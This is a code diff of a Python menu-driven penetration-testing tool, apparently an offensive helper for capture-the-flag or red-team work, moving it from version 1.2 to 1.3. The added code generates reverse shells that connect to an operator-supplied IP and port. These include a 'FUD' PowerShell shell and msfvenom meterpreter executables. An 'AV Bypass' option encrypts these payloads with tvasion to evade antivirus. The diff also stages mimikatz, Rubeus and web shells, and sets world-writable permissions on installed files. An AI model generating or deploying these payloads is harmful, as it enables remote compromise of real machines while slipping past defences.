@@ -3,6 +3,7 @@
 #reverse shells based on pentestmonkey and nishang shells
 import re
 import subprocess
+import inquirer
 from subprocess import call
 import os
 import colorama
@@ -94,14 +95,14 @@ def print_list(list):
         else:
             print(Style.BRIGHT+Fore.RED+"[+] --> "+ Style.BRIGHT+Fore.GREEN +str(i+1) +"."+Style.BRIGHT+Fore.BLUE+ " " + list[i])
     print(Style.BRIGHT+Fore.RED+"[+] --> "+ Style.BRIGHT+Fore.GREEN +str("0") +"."+Style.BRIGHT+Fore.BLUE+ "  exit")
-    
+
 def select_item(list, length):
     choise = ""
     print_list(list)
-    print(Fore.GREEN+50*"-")    
+    print(Fore.GREEN+"              "+50*"-")    
     #inp = int(input("Enter a number: "))
-    inp = input("option >> "+Fore.RED)
-    print(Fore.GREEN+50*"-")    
+    inp = input("                               option >> "+Fore.RED)
+    print(Fore.GREEN+"              "+50*"-")  
     try:
         res = int(inp)
     except ValueError:
@@ -352,8 +353,32 @@ def nishang(ip,port):
     print(Fore.GREEN+50*"-")    
     print(Fore.BLUE +"[+] ip: "+str(ip))
     print(Fore.BLUE +"[+] port: "+str(port))
+    print(Fore.GREEN+50*"-")
+    print(Fore.RED + "[+] Your nishang reverse shell has been created and saved in your working directory !") 
+    return output_file_name
+
+def FUD(ip,port):
+    readed_data = ""
+    final_data =""
+    output_file_name = "FUD-revshell_"+str(port)+".ps1"    
+    full_path = str(script_pt)+"/tools/windows/shell/revshell_FUD.ps1"
+    try:
+        with open(full_path, 'r') as infile:
+            for myline in infile:
+                readed_data += myline      
+    except IOError:
+        print ("error opening file")
+    command = "Invoke-Shell -Reverse -world "
+    command += str(ip)+" "
+    command += "-CountrY "+str(port)+"\n"
+    final_data = readed_data + command
+    save_path = str(current_path)+"/"+output_file_name
+    write_to_file(save_path, final_data)
+    print(Fore.GREEN+50*"-")    
+    print(Fore.BLUE +"[+] ip: "+str(ip))
+    print(Fore.BLUE +"[+] port: "+str(port))
     print(Fore.GREEN+50*"-")         
-    print(Fore.RED + "[+] Your nishang shell has been created and saved in your working directory !") 
+    print(Fore.RED + "[+] Your FUD reverse shell has been created and saved in your working directory !") 
     return output_file_name
 
 def rce_shell():
@@ -407,18 +432,54 @@ def msfc(ip,port,shell):
         if str(inp) == "":
             print(Fore.RED+"[-] Command can not be empty !")
             exit(1)
-        command = "msfvenom -p "+str(shell)+" CMD='"+str(inp)+"' -f exe > win-cmd-shell.exe"
+        command = "msfvenom -p "+str(shell)+" CMD='"+str(inp)+"' -f exe > en-win-cmd-shell.exe"
         win(ip,port,command)
-        return "win-cmd-shell.exe"
+        return "en-win-cmd-shell.exe"
     elif shell == "windows/x64/meterpreter/reverse_tcp":
-        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" -f exe > Win-shell-"+str(port)+".exe"
+        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" -f exe > en-Win-shell-"+str(port)+".exe"
         win(ip,port,command)
-        shell_name = "Win-shell-"+str(port)+".exe"
+        shell_name = "en-Win-shell-"+str(port)+".exe"
         return shell_name
 
 def temp_folder():
     name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10))
     return name
+
+def check_space(path):
+    return path.replace(' ', '\\ ')
+
+def prepare():
+    res = subprocess.check_output(["ls", "/opt/"])
+    files = res.decode('UTF-8').strip()
+    if "simpScript" not in files:
+        create_folder= subprocess.check_output(["mkdir","/opt/simpScript"])
+        subprocess.call(["chmod","777","/opt/simpScript/"])
+
+def check_bin(script):
+    res = subprocess.check_output(["ls", "/usr/local/bin/"])
+    files = res.decode('UTF-8').strip()
+    if script in files:
+        file = "/usr/local/bin/"+str(script)
+        remove = subprocess.check_output(["rm",file])
+
+def install_script(name):
+    prepare()
+    tool = str(script_pt)+"/scripts/"+str(name)
+    copy = subprocess.check_output(["cp", tool,"/opt/simpScript/"])
+    #command = "ln -s /opt/simpScript/"+str(name)+" /usr/local/bin/"
+    command = "/opt/simpScript/"+str(name)
+    check_bin(name)
+    #ln = subprocess.check_output([command])
+    subprocess.call(["ln","-s",command,"/usr/local/bin/"])
+    perm1 = "/usr/local/bin/"+str(name)
+    perm2 = "/opt/simpScript/"+str(name)
+    subprocess.call(["chmod","777",perm1])
+    subprocess.call(["chmod","777",perm2])
+
+def third_tools(name):
+        path = str(script_pt)+"/scripts/"+str(name)
+        subprocess.call(["chmod","777",path])
+        os.system(path)
 
 def tvasion(ip,port,type,shell):
     tmp_folder = temp_folder()
@@ -428,10 +489,9 @@ def tvasion(ip,port,type,shell):
         nishang_path = str(current_path)+"/"+nishang_name
         dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
         path_to_encrypted = str(current_path)+temp #get the path
-        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path 
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
         args = " -t ps1 "+nishang_path+ " -o "+tmp_folder #save the file into temp folder
         command = enc_tool_path+args
-        #encr = subprocess.check_output([command]) #excute  the encryption
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
         output = process.communicate()
         res = subprocess.check_output(["ls", path_to_encrypted])
@@ -442,6 +502,25 @@ def tvasion(ip,port,type,shell):
         copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
         delete_original = subprocess.check_output(["rm",original_shell])
+    elif type == "FUD reverse shell":
+        fud_name = FUD(ip,port)
+        fud_path = str(current_path)+"/"+fud_name
+        dir1 = subprocess.check_output(["mkdir", current_path+temp]) #create a temp folder
+        path_to_encrypted = str(current_path)+temp #get the path
+        enc_tool_path = str(script_pt)+"/tvasion.ps1" #encrypt tool path
+        args = " -t ps1 "+fud_path+ " -o "+tmp_folder #save the file into temp folder
+        command = enc_tool_path+args
+        #encr = subprocess.check_output([command]) #excute  the encryption
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
+        output = process.communicate()
+        res = subprocess.check_output(["ls", path_to_encrypted])
+        en_file_name = res.decode('UTF-8').strip() # get encrypted file name
+        exact_file_name_path = path_to_encrypted+en_file_name #encrypted nishang
+        final_shell = current_path+"/en-"+fud_name
+        original_shell = current_path+"/"+fud_name
+        copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
+        delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
+        delete_original = subprocess.check_output(["rm",original_shell])        
     elif type == "msf":
         shell_name = msfc(ip,port,shell)
         shell_path = str(current_path)+"/"+shell_name
@@ -455,32 +534,78 @@ def tvasion(ip,port,type,shell):
         res = subprocess.check_output(["ls", path_to_encrypted])
         en_file_name = res.decode('UTF-8').strip() # get encrypted file name
         exact_file_name_path = path_to_encrypted+en_file_name
-        final_shell = current_path+"/en-"+shell_name
-        original_shell = current_path+"/"+shell_name
+        final_shell = current_path+"/"+shell_name
         copy = subprocess.check_output(["cp", exact_file_name_path,final_shell]) # copy the encrypted to the working dir    
         delete_original = subprocess.check_output(["rm","-r",path_to_encrypted])
-        delete_original = subprocess.check_output(["rm",original_shell])
+
+
+def sources(name):
+	if name == "parrot":
+		return "deb http://deb.debian.org/debian/ jessie main contrib non-free","deb https://http.kali.org/kali kali-rolling main non-free contrib"
+	elif name == "kali":
+		return "deb https://http.kali.org/kali kali-rolling main non-free contrib"
+
+def os_name():
+	res = subprocess.check_output(["uname","-r"])
+	res = res.decode('UTF-8').strip()
+	if "parrot" in res:
+		return "parrot"
+	elif "kali" in res:
+		return "kali"
+	else:
+		print(Fore.RED+"[-] OS NOT SUPPORTED !")
+		exit()
+
+def check_apt():
+	original = subprocess.check_output(["cat","/etc/apt/sources.list" ])
+	#get apt file content
+	original_sources = original.decode('UTF-8').splitlines()
+	#remove spaces
+	original_sources_without = []
+	for i in original_sources:
+		original_sources_without.append(i.replace(' ',''))
+	if str(os_name()) == "kali":
+		print(Fore.GREEN+"--> ["+Fore.RED+str(os_name())+Fore.GREEN+"] os detected !")
+		recommended = list(sources("kali"))
+		for i in range(len(recommended)):
+			if recommended[i].replace(' ','') not in original_sources_without:
+				command = "echo '"+str(recommended[i])+"' >> /etc/apt/sources.list"
+				os.system(command)
+		print(Fore.RED+"[+]"+Fore.GREEN+" Adding default ["+Fore.RED+str(os_name())+Fore.GREEN+"] sources list done !")	
+	elif str(os_name()) == "parrot":
+		print(Fore.GREEN+"--> ["+Fore.RED+str(os_name())+Fore.GREEN+"] os detected !")
+		recommended = list(sources("parrot"))
+		for i in range(len(recommended)):
+			if recommended[i].replace(' ','') not in original_sources_without:
+				command = "echo '"+str(recommended[i])+"' >> /etc/apt/sources.list"
+				os.system(command)
+		print(Fore.RED+"[+]"+Fore.GREEN+" Adding default ["+Fore.RED+str(os_name())+Fore.GREEN+"] sources list done !")
+	else:
+		print(Fore.RED+"[-] OS NOT SUPPORTED !")
+		exit()
 
 script_pt = script_path()
 current_path = get_path()
 
-os_list = ["Windows","Linux","magic bytes reverse shell for linux","AV Bypass","AES 256 mode_cbc base64 decoder","AMSI powershell bypass","Bruteforce template"]
-main_list_windows = ["generate shell","enum tools","windows tools"]
+os_list = ["Windows","Linux","magic bytes reverse shell for linux","AV Bypass","AES 256 mode_cbc base64 decoder","AMSI powershell bypass","Bruteforce template","install scripts","install third-party apps","install Top tools"]
+main_list_windows = ["generate shell","enum tools","exe windows tools","ps1 windows tools"]
 main_list_linux = ["generate shell","tools and enumeration scripts"]
-windows_shells = ["nishang shell","windows/exec","windows/x64/exec","windows/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_tcp","php cmd web shell","aspx cmd web shell"]
+windows_shells = ["nishang shell","FUD reverse shell","windows/exec","windows/x64/exec","windows/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_tcp","php cmd web shell","aspx cmd web shell"]
 linux_shell = ["bash","nc","simple php","full php","python","perl","rce shell","ruby","java","linux/x86/meterpreter/reverse_tcp"]
 linux_tools = ["LinEnum.sh","linpeas.sh","lse.sh","nc","pspy64","pwncat"]
 windows_enum = ["jaws.ps1","PowerUp.ps1","Sherlock.ps1","winPEAS.bat","wp.exe"]
-windows_tools =["accesschk.exe","curl.exe","nc.exe","powerview.ps1","wget.exe","base64.exe","dumpcap.exe","powercat.ps1","procdump64.exe","chisel86.exe","juicy.exe","powermad.ps1","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
+windows_exec_tools = ["accesschk.exe","curl.exe","nc.exe","wget.exe","base64.exe","dumpcap.exe","procdump64.exe","chisel86.exe","juicy.exe","Rubeus.exe","cmd.exe","mimikatz64.exe","powershell.exe","SharpHound.exe"]
+windows_ps1_tools = ["powerview.ps1","powercat.ps1","powermad.ps1","PowerUpSQL.ps1"]
 magic_bytes = ["jpg simple php magic bytes","jpg full php magic bytes","gif simple php magic bytes","gif full php magic bytes"]
 template = ["python","php","smb-login-brute.sh"]
-encrypted = ["nishang","msf"]
+encrypted = ["nishang","FUD reverse shell","msf"]
 msf = ["windows/x64/exec","windows/x64/meterpreter/reverse_tcp"]
 msf_size = len(msf)
 encrypted_size = len(encrypted)
 template_size = len(template)
 magic_bytes_size = len(magic_bytes)
-windows_tools_size = len(windows_tools)
+windows_exec_tools_size = len(windows_exec_tools)
+windows_ps1_tools_size = len(windows_ps1_tools)
 windows_enum_size = len(windows_enum)
 linux_tools_size = len(linux_tools)
 linux_shell_size = len(linux_shell)
@@ -497,7 +622,7 @@ print("\n\t\t\t\t\t\t\tby YaSsInE\n")
 print("\t"+Fore.GREEN+60*"=")
 print(Fore.GREEN+"\t="+Fore.BLUE+"  Website    : https://0xyassine.github.io"+Fore.GREEN+"\t\t   =")
 print(Fore.GREEN+"\t="+Fore.BLUE+"  HackTheBox : https://www.hackthebox.eu/profile/143843"+Fore.GREEN+"   =")
-print(Fore.GREEN+"\t="+Fore.RED+"\t\t\t\t\t\t    v1.2"+Fore.GREEN+"   =")
+print(Fore.GREEN+"\t="+Fore.RED+"\t\t\t\t\t\t    v1.3"+Fore.GREEN+"   =")
 print("\t"+Fore.GREEN+60*"="+"\n")
 
 
@@ -513,6 +638,10 @@ if os_item == "Windows":
             ip = get_ip()
             port = get_port()
             test = nishang(ip, port)
+        if windows_item == "FUD reverse shell":
+            ip = get_ip()
+            port = get_port()
+            test = FUD(ip, port)
         elif windows_item == "windows/exec":
             windows("0", "0", windows_item)   
         elif windows_item == "windows/x64/exec":
@@ -543,7 +672,7 @@ if os_item == "Windows":
             print(Fore.RED+"       Invoke-AllChecks")
             print(Fore.BLUE+100*"-")
         elif windows_enum_item == "Sherlock.ps1":
-            move_files("windows","enum",windows_enum_item)
+            move_files("windows","enum",windows_enum_item)           
         elif windows_enum_item == "winPEAS.bat":
             move_files("windows","enum",windows_enum_item)            
         elif windows_enum_item == "wp.exe":
@@ -551,31 +680,25 @@ if os_item == "Windows":
             print(Fore.BLUE+100*"-")
             print(Fore.RED+"Usage: .\wp.exe --audit -A -e -f -I -o report")
             print(Fore.BLUE+100*"-")
-    elif main_item == "windows tools":
-        windows_tools_item = select_item(windows_tools, windows_tools_size)
+    elif main_item == "exe windows tools":
+        windows_tools_item = select_item(windows_exec_tools, windows_exec_tools_size)
         if windows_tools_item == "accesschk.exe":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "curl.exe":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "nc.exe":
-            move_files("windows","tools",windows_tools_item)   
-        elif windows_tools_item == "powerview.ps1":
-            move_files("windows","tools",windows_tools_item)                             
+            move_files("windows","tools",windows_tools_item)                                
         elif windows_tools_item == "wget.exe":
             move_files("windows","tools",windows_tools_item) 
         elif windows_tools_item == "base64.exe":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "dumpcap.exe":
-            move_files("windows","tools",windows_tools_item)                        
-        elif windows_tools_item == "powercat.ps1":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "procdump64.exe":
             move_files("windows","tools",windows_tools_item)            
         elif windows_tools_item == "chisel86.exe":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "juicy.exe":
-            move_files("windows","tools",windows_tools_item)
-        elif windows_tools_item == "powermad.ps1":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "Rubeus.exe":
             move_files("windows","tools",windows_tools_item)            
@@ -586,7 +709,17 @@ if os_item == "Windows":
         elif windows_tools_item == "powershell.exe":
             move_files("windows","tools",windows_tools_item)
         elif windows_tools_item == "SharpHound.exe":
-            move_files("windows","tools",windows_tools_item)                                      
+            move_files("windows","tools",windows_tools_item)
+    elif main_item == "ps1 windows tools":
+        windows_tools_item = select_item(windows_ps1_tools, windows_ps1_tools_size)
+        if windows_tools_item == "powerview.ps1":
+            move_files("windows","tools",windows_tools_item)
+        elif windows_tools_item == "PowerUpSQL.ps1":
+            move_files("windows","tools",windows_tools_item)
+        elif windows_tools_item == "powermad.ps1":
+            move_files("windows","tools",windows_tools_item)
+        elif windows_tools_item == "powercat.ps1":
+            move_files("windows","tools",windows_tools_item)                        
 elif os_item == "Linux":
     main_item = select_item(main_list_linux, main_list_linux_size)
     if main_item == "generate shell":
@@ -661,6 +794,10 @@ elif os_item == "AV Bypass":
         ip = get_ip()
         port = get_port()
         tvasion(ip,port,"nishang","")
+    elif encrypted_item == "FUD reverse shell":
+        ip = get_ip()
+        port = get_port()
+        tvasion(ip,port,"FUD reverse shell","")        
     elif encrypted_item == "msf":
         msf_item = select_item(msf, msf_size)
         if msf_item == "windows/x64/exec":
@@ -669,3 +806,41 @@ elif os_item == "AV Bypass":
             ip = get_ip()
             port = get_port()            
             tvasion(ip,port,"msf",msf_item)
+elif os_item == "install scripts":
+    items = []
+    questions = [inquirer.Checkbox('scripts',message="use space to select tool(s) and press enter for install ",choices=['smb-login-brute.sh','oneliner.py'],)]
+    answers = inquirer.prompt(questions)
+    if len(answers['scripts']) == 0:
+        print(Fore.RED+"[-] No script selected !")
+        exit()
+    else:
+        items = list(answers.values())
+        for i in items[0]:
+            install_script(i)
+            print(Fore.GREEN+"[+] "+str(i) +" is installed. You can run "+str(i)+ " directly from your terminal !")
+elif os_item == "install third-party apps":
+    items = []
+    questions = [inquirer.Checkbox('scripts',message="use space to select app(s) and press enter for install ",choices=['chrome','sublime-text','virtualbox','xdm','mega-sync','teamviewer','vscode'],)]
+    answers = inquirer.prompt(questions)
+    if len(answers['scripts']) == 0:
+        print(Fore.RED+"[-] No script selected !")
+        exit()
+    else:
+        items = list(answers.values())
+        for i in items[0]:
+            name = str(i)+".sh"
+            third_tools(name)
+elif os_item == "install Top tools":
+    check_apt()
+    print(Fore.RED+"[+]"+Fore.GREEN+" Installing top tools started !")
+    if str(os_name()) == "kali":
+        tool = str(script_pt)+"/scripts/kali-setup.sh"
+        subprocess.call(["chmod","777",tool])
+        os.system(tool)
+    elif str(os_name()) == "parrot":
+        tool = str(script_pt)+"/scripts/parrot-setup.sh"
+        subprocess.call(["chmod","777",tool])
+        os.system(tool)
+    else:
+        print(Fore.RED+"[-] OS NOT SUPPORTED !")
+        exit()
